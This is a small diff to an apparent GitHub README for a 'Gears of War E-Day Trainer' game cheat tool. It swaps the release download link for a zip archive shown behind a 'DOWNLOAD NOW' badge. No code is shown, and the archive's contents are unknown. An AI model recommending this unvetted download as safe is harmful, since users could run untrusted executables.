@@ -5,7 +5,7 @@
 </div>
 
 <p align="center">
-  <a href="https://github.com/AngelClaraef/Gears-of-War-E-Day-Trainer/releases/download/1/Gears-E-DayTrainer.zip">
+  <a href="https://github.com/AngelClaraef/Gears-of-War-E-Day-Trainer/releases/download/2/Gears-of-War-E-Day-Trainer.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
   <br><br>
